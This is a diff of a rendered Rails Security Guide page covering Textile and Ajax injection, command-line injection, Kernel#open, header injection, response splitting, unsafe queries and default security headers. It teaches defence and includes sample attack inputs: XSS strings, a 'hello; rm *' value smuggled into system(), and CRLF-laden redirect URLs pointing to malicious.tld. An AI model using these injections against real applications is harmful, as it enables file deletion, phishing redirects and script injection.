+<textarea class="clipboard-content" id="clipboard-ab2111df11833a26adf6373c721f2564">RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;').to_html
 # =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-099fe7a2c2690651c37b7c3c9db70834">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-ab2111df11833a26adf6373c721f2564">Copiar</button>
 </div>
 <p>Use the <code>:filter_html</code> option to remove HTML which was not created by the Textile processor.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span class="p">,</span> <span class="p">[</span><span class="ss">:filter_html</span><span class="p">]).</span><span class="nf">to_html</span>
 <span class="c1"># =&gt; "alert(1)"</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-7a57d710f8d3370ecdc8a1268d277915">RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html
+<textarea class="clipboard-content" id="clipboard-9dba6b467c31baf455abaca7531ac138">RedCloth.new('&lt;script&gt;alert(1)&lt;/script&gt;', [:filter_html]).to_html
 # =&gt; "alert(1)"
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-7a57d710f8d3370ecdc8a1268d277915">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-9dba6b467c31baf455abaca7531ac138">Copiar</button>
 </div>
 <p>However, this does not filter all HTML, a few tags will be left (by design), for example <code>&lt;a&gt;</code>:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;"</span><span class="p">,</span> <span class="p">[</span><span class="ss">:filter_html</span><span class="p">]).</span><span class="nf">to_html</span>
 <span class="c1"># =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-fda0080ab608caee6c4c66ac61c87ba0">RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html
+<textarea class="clipboard-content" id="clipboard-f71a68644bdbb9be038baa5408845b85">RedCloth.new("&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;", [:filter_html]).to_html
 # =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-fda0080ab608caee6c4c66ac61c87ba0">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-f71a68644bdbb9be038baa5408845b85">Copiar</button>
 </div>
-<h5 id="textile-injection-countermeasures"><a class="anchorlink" href="#textile-injection-countermeasures">7.5.1 Countermeasures</a></h5><p>It is recommended to <em>use RedCloth in combination with a permitted input filter</em>, as described in the countermeasures against XSS section.</p><h4 id="ajax-injection"><a class="anchorlink" href="#ajax-injection">7.6 Ajax Injection</a></h4><div class="note"><p><em>The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view.</em></p></div><p>If you use the <a href="https://rubygems.org/gems/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em>you have to escape the return value in the action</em>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the <code>h()</code> method.</p><h4 id="command-line-injection"><a class="anchorlink" href="#command-line-injection">7.7 Command Line Injection</a></h4><div class="note"><p><em>Use user-supplied command line parameters with caution.</em></p></div><p>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: <code>exec(command)</code>, <code>syscall(command)</code>, <code>system(command)</code> and <code>command</code>. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (<code>;</code>) or a vertical bar (<code>|</code>).</p><p>A countermeasure is to <em>use the <code>system(command, parameters)</code> method which passes command line parameters safely</em>.</p><div class="code_container">
+<h5 id="textile-injection-countermeasures"><a class="anchorlink" href="#textile-injection-countermeasures">7.5.1 Countermeasures</a></h5><p>It is recommended to <em>use RedCloth in combination with a permitted input filter</em>, as described in the countermeasures against XSS section.</p><h4 id="ajax-injection"><a class="anchorlink" href="#ajax-injection">7.6 Ajax Injection</a></h4><div class="note"><p><em>The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view.</em></p></div><p>If you use the <a href="https://rubygems.org/gems/in_place_editing">in_place_editor plugin</a>, or actions that return a string, rather than rendering a view, <em>you have to escape the return value in the action</em>. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the <code>h()</code> method.</p><h4 id="command-line-injection"><a class="anchorlink" href="#command-line-injection">7.7 Command Line Injection</a></h4><div class="note"><p><em>Use user-supplied command line parameters with caution.</em></p></div><p>If your application has to execute commands in the underlying operating system, there are several methods in Ruby: <code>system(command)</code>, <code>exec(command)</code>, <code>spawn(command)</code> and <code>`command`</code>. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (<code>;</code>) or a vertical bar (<code>|</code>).</p><div class="code_container">
+<pre><code class="highlight ruby"><span class="n">user_input</span> <span class="o">=</span> <span class="s2">"hello; rm *"</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/echo </span><span class="si">#{</span><span class="n">user_input</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<span class="c1"># prints "hello", and deletes files in the current directory</span>
+</code></pre>
+<textarea class="clipboard-content" id="clipboard-cc7c9d55b367de1942a0e2ffea7b5409">user_input = "hello; rm *"
+system("/bin/echo #{user_input}")
+# prints "hello", and deletes files in the current directory
+</textarea>
+<button class="clipboard-button" data-clipboard-target="#clipboard-cc7c9d55b367de1942a0e2ffea7b5409">Copiar</button>
+</div>
+<p>A countermeasure is to <em>use the <code>system(command, parameters)</code> method which passes command line parameters safely</em>.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/echo"</span><span class="p">,</span><span class="s2">"hello; rm *"</span><span class="p">)</span>
 <span class="c1"># prints "hello; rm *" and does not delete files</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-6053b427ea1ab3cc59f72531a58299fd">system("/bin/echo","hello; rm *")
+<textarea class="clipboard-content" id="clipboard-53cff3ce139e4ab7783a44f65a342851">system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-6053b427ea1ab3cc59f72531a58299fd">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-53cff3ce139e4ab7783a44f65a342851">Copiar</button>
+</div>
+<h5 id="kernel-open-s-vulnerability"><a class="anchorlink" href="#kernel-open-s-vulnerability">7.7.1 Kernel#open's vulnerability</a></h5><p><code>Kernel#open</code> executes OS command if the argument starts with a vertical bar (<code>|</code>).</p><div class="code_container">
+<pre><code class="highlight ruby"><span class="nb">open</span><span class="p">(</span><span class="s1">'| ls'</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># returns file list as a String via `ls` command</span>
+</code></pre>
+<textarea class="clipboard-content" id="clipboard-0d9b0ae660fac6a7aa5e7100b7d0973f">open('| ls') { |f| f.read }
+# returns file list as a String via `ls` command
+</textarea>
+<button class="clipboard-button" data-clipboard-target="#clipboard-0d9b0ae660fac6a7aa5e7100b7d0973f">Copiar</button>
+</div>
+<p>Countermeasures are to use <code>File.open</code>, <code>IO.open</code> or <code>URI#open</code> instead. They don't execute an OS command.</p><div class="code_container">
+<pre><code class="highlight ruby"><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'| ls'</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># doesn't execute `ls` command, just opens `| ls` file if it exists</span>
+
+<span class="no">IO</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># opens stdin. doesn't accept a String as the argument</span>
+
+<span class="nb">require</span> <span class="s1">'open-uri'</span>
+<span class="no">URI</span><span class="p">(</span><span class="s1">'https://example.com'</span><span class="p">).</span><span class="nf">open</span> <span class="p">{</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># opens the URI. `URI()` doesn't accept `| ls`</span>
+</code></pre>
+<textarea class="clipboard-content" id="clipboard-0422bceb2d2dd0a883dad1011dd06ac0">File.open('| ls') { |f| f.read }
+# doesn't execute `ls` command, just opens `| ls` file if it exists
+
+IO.open(0) { |f| f.read }
+# opens stdin. doesn't accept a String as the argument
+
+require 'open-uri'
+URI('https://example.com').open { |f| f.read }
+# opens the URI. `URI()` doesn't accept `| ls`
+</textarea>
+<button class="clipboard-button" data-clipboard-target="#clipboard-0422bceb2d2dd0a883dad1011dd06ac0">Copiar</button>
 </div>
 <h4 id="header-injection"><a class="anchorlink" href="#header-injection">7.8 Header Injection</a></h4><div class="warning"><p><em>HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS, or HTTP response splitting.</em></p></div><p>HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie, and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. <em>Remember to escape these header fields, too.</em> For example when you display the user agent in an administration area.</p><p>Besides that, it is <em>important to know what you are doing when building response headers partly based on user input.</em> For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">redirect_to</span> <span class="n">params</span><span class="p">[</span><span class="ss">:referer</span><span class="p">]</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-a6ec49a3c66404d806c48e257c784cb7">redirect_to params[:referer]
+<textarea class="clipboard-content" id="clipboard-4006a29639f37733a304e8092c885503">redirect_to params[:referer]
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-a6ec49a3c66404d806c48e257c784cb7">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-4006a29639f37733a304e8092c885503">Copiar</button>
 </div>
 <p>What happens is that Rails puts the string into the <code>Location</code> header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:</p><div class="code_container">
 <pre><code class="highlight plaintext">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-d47ad277f647af983fd16a66ef959d98">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
+<textarea class="clipboard-content" id="clipboard-cbbb5972fbab9cb71f543094251ef621">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-d47ad277f647af983fd16a66ef959d98">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-cbbb5972fbab9cb71f543094251ef621">Copiar</button>
 </div>
 <p>And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:</p><div class="code_container">
 <pre><code class="highlight plaintext">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-3808de8662e19e2497e9b9b3dd013f99">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
+<textarea class="clipboard-content" id="clipboard-55f3ecb62187f72f5a3a71f205f6cd44">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-3808de8662e19e2497e9b9b3dd013f99">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-55f3ecb62187f72f5a3a71f205f6cd44">Copiar</button>
 </div>
 <p>Note that <code>%0d%0a</code> is URL-encoded for <code>\r\n</code> which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.</p><div class="code_container">
 <pre><code class="highlight http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
 <span class="s">(...)</span>
 <span class="na">Location</span><span class="p">:</span> <span class="s">http://www.malicious.tld</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-12e8a4990a1259e34c1c71431901ef0b">HTTP/1.1 302 Moved Temporarily
+<textarea class="clipboard-content" id="clipboard-35ec009226141a70d8c01a015ed1056a">HTTP/1.1 302 Moved Temporarily
 (...)
 Location: http://www.malicious.tld
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-12e8a4990a1259e34c1c71431901ef0b">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-35ec009226141a70d8c01a015ed1056a">Copiar</button>
 </div>
 <p>So <em>attack vectors for Header Injection are based on the injection of CRLF characters in a header field.</em> And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the <code>redirect_to</code> method. <em>Make sure you do it yourself when you build other header fields with user input.</em></p><h5 id="response-splitting"><a class="anchorlink" href="#response-splitting">7.8.1 Response Splitting</a></h5><p>If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:</p><div class="code_container">
 <pre><code class="highlight http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found [First standard 302 response]</span>
@@ -1022,7 +1052,7 @@ Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-93b9318eb89d28fe73b3b835f080cac6">HTTP/1.1 302 Found [First standard 302 response]
+<textarea class="clipboard-content" id="clipboard-3b7c4be295bf04af9e95a2df8faae4bd">HTTP/1.1 302 Found [First standard 302 response]
 Date: Tue, 12 Apr 2005 22:09:07 GMT
 Location:Content-Type: text/html
 
@@ -1037,7 +1067,7 @@ Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-93b9318eb89d28fe73b3b835f080cac6">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-3b7c4be295bf04af9e95a2df8faae4bd">Copiar</button>
 </div>
 <p>Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. <em>In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</em></p><h3 id="unsafe-query-generation"><a class="anchorlink" href="#unsafe-query-generation">8 Unsafe Query Generation</a></h3><p>Due to the way Active Record interprets parameters in combination with the way
 that Rack parses query parameters it was possible to issue unexpected database
@@ -1052,12 +1082,12 @@ wasn't performed is:</p><div class="code_container">
   <span class="n">user</span><span class="p">.</span><span class="nf">reset_password!</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-b8480d834bdaa74e0a9557fd00594df7">unless params[:token].nil?
+<textarea class="clipboard-content" id="clipboard-e56f199788d2e74ca10ea2748dbe53dd">unless params[:token].nil?
   user = User.find_by_token(params[:token])
   user.reset_password!
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-b8480d834bdaa74e0a9557fd00594df7">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-e56f199788d2e74ca10ea2748dbe53dd">Copiar</button>
 </div>
 <p>When <code>params[:token]</code> is one of: <code>[nil]</code>, <code>[nil, nil, ...]</code> or
 <code>['foo', nil]</code> it will bypass the test for <code>nil</code>, but <code>IS NULL</code> or
@@ -1098,30 +1128,30 @@ request:</p>
 your application if you are aware of the risk and know how to handle it:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">perform_deep_munge</span> <span class="o">=</span> <span class="kp">false</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-b4c34a77e1d7369fdc1e3b7b8826d486">config.action_dispatch.perform_deep_munge = false
+<textarea class="clipboard-content" id="clipboard-74a85733ab82f8afe89aa3ee90deb88a">config.action_dispatch.perform_deep_munge = false
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-b4c34a77e1d7369fdc1e3b7b8826d486">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-74a85733ab82f8afe89aa3ee90deb88a">Copiar</button>
 </div>
 <h3 id="default-headers"><a class="anchorlink" href="#default-headers">9 Default Headers</a></h3><p>Every HTTP response from your Rails application receives the following default security headers.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span> <span class="o">=</span> <span class="p">{</span>
   <span class="s1">'X-Frame-Options'</span> <span class="o">=&gt;</span> <span class="s1">'SAMEORIGIN'</span><span class="p">,</span>
-  <span class="s1">'X-XSS-Protection'</span> <span class="o">=&gt;</span> <span class="s1">'1; mode=block'</span><span class="p">,</span>
+  <span class="s1">'X-XSS-Protection'</span> <span class="o">=&gt;</span> <span class="s1">'0'</span><span class="p">,</span>
   <span class="s1">'X-Content-Type-Options'</span> <span class="o">=&gt;</span> <span class="s1">'nosniff'</span><span class="p">,</span>
   <span class="s1">'X-Download-Options'</span> <span class="o">=&gt;</span> <span class="s1">'noopen'</span><span class="p">,</span>
   <span class="s1">'X-Permitted-Cross-Domain-Policies'</span> <span class="o">=&gt;</span> <span class="s1">'none'</span><span class="p">,</span>
   <span class="s1">'Referrer-Policy'</span> <span class="o">=&gt;</span> <span class="s1">'strict-origin-when-cross-origin'</span>
 <span class="p">}</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-ad0c2d4ec9744edd8f87024afe9d3b85">config.action_dispatch.default_headers = {
+<textarea class="clipboard-content" id="clipboard-a7c721fd04d4ef0a912116bc2db2892a">config.action_dispatch.default_headers = {
   'X-Frame-Options' =&gt; 'SAMEORIGIN',
-  'X-XSS-Protection' =&gt; '1; mode=block',
+  'X-XSS-Protection' =&gt; '0',
   'X-Content-Type-Options' =&gt; 'nosniff',
   'X-Download-Options' =&gt; 'noopen',
   'X-Permitted-Cross-Domain-Policies' =&gt; 'none',
   'Referrer-Policy' =&gt; 'strict-origin-when-cross-origin'
 }
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-ad0c2d4ec9744edd8f87024afe9d3b85">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-a7c721fd04d4ef0a912116bc2db2892a">Copiar</button>
 </div>
 <p>You can configure default headers in <code>config/application.rb</code>.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span> <span class="o">=</span> <span class="p">{</span>
@@ -1129,30 +1159,30 @@ your application if you are aware of the risk and know how to handle it:</p><div
   <span class="s1">'X-Frame-Options'</span> <span class="o">=&gt;</span> <span class="s1">'DENY'</span>
 <span class="p">}</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-96e08557d3b9a7689a1f58759467bc39">config.action_dispatch.default_headers = {
+<textarea class="clipboard-content" id="clipboard-1c680a808216baeb66fcfcf02d2170ca">config.action_dispatch.default_headers = {
   'Header-Name' =&gt; 'Header-Value',
   'X-Frame-Options' =&gt; 'DENY'
 }
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-96e08557d3b9a7689a1f58759467bc39">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-1c680a808216baeb66fcfcf02d2170ca">Copiar</button>
 </div>
 <p>Or you can remove them.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">.</span><span class="nf">clear</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-b2bcf245a70cdea658d1d330266e2ee5">config.action_dispatch.default_headers.clear
+<textarea class="clipboard-content" id="clipboard-cfdbcebfa36e65e072f4a6e6879668d5">config.action_dispatch.default_headers.clear
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-b2bcf245a70cdea658d1d330266e2ee5">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-cfdbcebfa36e65e072f4a6e6879668d5">Copiar</button>
 </div>
 <p>Here is a list of common headers:</p>
 <ul>
 <li>
 <strong>X-Frame-Options:</strong> <em><code>SAMEORIGIN</code> in Rails by default</em> - allow framing on same domain. Set it to 'DENY' to deny framing at all or remove this header completely if you want to allow framing on all websites.</li>
 <li>
-<strong>X-XSS-Protection:</strong> <em><code>1; mode=block</code> in Rails by default</em> - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)</li>
+<strong>X-XSS-Protection:</strong> <em><code>0</code> in Rails by default</em> - <a href="https://owasp.org/www-project-secure-headers/#x-xss-protection">deprecated legacy header</a>, set to '0' to disable problematic legacy XSS auditors.</li>
 <li>
 <strong>X-Content-Type-Options:</strong> <em><code>nosniff</code> in Rails by default</em> - stops the browser from guessing the MIME type of a file.</li>
 <li>
-<strong>X-Content-Security-Policy:</strong> <a href="http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html">A powerful mechanism for controlling which sites certain content types can be loaded from</a>
+<strong>X-Content-Security-Policy:</strong> <a href="https://w3c.github.io/webappsec-csp/">A powerful mechanism for controlling which sites certain content types can be loaded from</a>
 </li>
 <li>
 <strong>Access-Control-Allow-Origin:</strong> Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.</li>
@@ -1178,7 +1208,7 @@ values into the header such as account subdomains in a multi-tenant application.
   <span class="n">policy</span><span class="p">.</span><span class="nf">report_uri</span> <span class="s2">"/csp-violation-report-endpoint"</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-bcc648ec856432d1d71b2303a654548e"># config/initializers/content_security_policy.rb
+<textarea class="clipboard-content" id="clipboard-4348cd1623c3e38d1fc57f7691270972"># config/initializers/content_security_policy.rb
 Rails.application.config.content_security_policy do |policy|
   policy.default_src :self, :https
   policy.font_src    :self, :https, :data
@@ -1191,7 +1221,7 @@ Rails.application.config.content_security_policy do |policy|
   policy.report_uri "/csp-violation-report-endpoint"
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-bcc648ec856432d1d71b2303a654548e">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-4348cd1623c3e38d1fc57f7691270972">Copiar</button>
 </div>
 <p>Example controller overrides:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="c1"># Override policy inline</span>
@@ -1220,7 +1250,7 @@ end
   <span class="n">content_security_policy</span> <span class="kp">false</span><span class="p">,</span> <span class="ss">only: :index</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-e5df612a600ebef3d5e46fab2deb6feb"># Override policy inline
+<textarea class="clipboard-content" id="clipboard-515d6e0ff25e1e76a74dba25765dbf44"># Override policy inline
 class PostsController &lt; ApplicationController
   content_security_policy do |p|
     p.upgrade_insecure_requests true
@@ -1246,7 +1276,7 @@ class LegacyPagesController &lt; ApplicationController
   content_security_policy false, only: :index
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-e5df612a600ebef3d5e46fab2deb6feb">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-515d6e0ff25e1e76a74dba25765dbf44">Copiar</button>
 </div>
 <p>Use the <code>content_security_policy_report_only</code>
 configuration attribute to set
@@ -1256,10 +1286,10 @@ legacy content</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="c1"># config/initializers/content_security_policy.rb</span>
 <span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_report_only</span> <span class="o">=</span> <span class="kp">true</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-a4d5f2cd32dda1e6fd4c411012aef224"># config/initializers/content_security_policy.rb
+<textarea class="clipboard-content" id="clipboard-444b3241293c3012adabd8a9a842eb1b"># config/initializers/content_security_policy.rb
 Rails.application.config.content_security_policy_report_only = true
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-a4d5f2cd32dda1e6fd4c411012aef224">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-444b3241293c3012adabd8a9a842eb1b">Copiar</button>
 </div>
 <div class="code_container">
 <pre><code class="highlight ruby"><span class="c1"># Controller override</span>
@@ -1267,12 +1297,12 @@ Rails.application.config.content_security_policy_report_only = true
   <span class="n">content_security_policy_report_only</span> <span class="ss">only: :index</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-aca27e1413d4d6be65340145b7b39a18"># Controller override
+<textarea class="clipboard-content" id="clipboard-ba399a58f3bd30aa87c9a4566efdfc4d"># Controller override
 class PostsController &lt; ApplicationController
   content_security_policy_report_only only: :index
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-aca27e1413d4d6be65340145b7b39a18">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-ba399a58f3bd30aa87c9a4566efdfc4d">Copiar</button>
 </div>
 <p>You can enable automatic nonce generation:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="c1"># config/initializers/content_security_policy.rb</span>
@@ -1282,14 +1312,14 @@ end
 
 <span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_generator</span> <span class="o">=</span> <span class="o">-&gt;</span> <span class="n">request</span> <span class="p">{</span> <span class="no">SecureRandom</span><span class="p">.</span><span class="nf">base64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="p">}</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-d72268998dbea4273177f197e54a7d25"># config/initializers/content_security_policy.rb
+<textarea class="clipboard-content" id="clipboard-b2f1480d446c4d4e5722bdbc606a6d45"># config/initializers/content_security_policy.rb
 Rails.application.config.content_security_policy do |policy|
   policy.script_src :self, :https
 end
 
 Rails.application.config.content_security_policy_nonce_generator = -&gt; request { SecureRandom.base64(16) }
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-d72268998dbea4273177f197e54a7d25">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-b2f1480d446c4d4e5722bdbc606a6d45">Copiar</button>
 </div>
 <p>Then you can add an automatic nonce value by passing <code>nonce: true</code>
 as part of <code>html_options</code>. Example:</p><div class="code_container">
@@ -1297,31 +1327,31 @@ as part of <code>html_options</code>. Example:</p><div class="code_container">
   alert('Hello, World!');
 <span class="cp">&lt;%</span> <span class="k">end</span> <span class="cp">-%&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-6bf46aa86e0d765cbf1a55be541f805b">&lt;%= javascript_tag nonce: true do -%&gt;
+<textarea class="clipboard-content" id="clipboard-d073f924b4a0415c8f1ad850abe3a098">&lt;%= javascript_tag nonce: true do -%&gt;
   alert('Hello, World!');
 &lt;% end -%&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-6bf46aa86e0d765cbf1a55be541f805b">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-d073f924b4a0415c8f1ad850abe3a098">Copiar</button>
 </div>
 <p>The same works with <code>javascript_include_tag</code>:</p><div class="code_container">
 <pre><code class="highlight erb"><span class="cp">&lt;%=</span> <span class="n">javascript_include_tag</span> <span class="s2">"script"</span><span class="p">,</span> <span class="ss">nonce: </span><span class="kp">true</span> <span class="cp">%&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-df3ea19cd41984a73237697835febde8">&lt;%= javascript_include_tag "script", nonce: true %&gt;
+<textarea class="clipboard-content" id="clipboard-577b9cba7a460c412b65ef734facbb0f">&lt;%= javascript_include_tag "script", nonce: true %&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-df3ea19cd41984a73237697835febde8">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-577b9cba7a460c412b65ef734facbb0f">Copiar</button>
 </div>
-<p>Use <a href="https://api.rubyonrails.org/v6.1.4/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag"><code>csp_meta_tag</code></a>
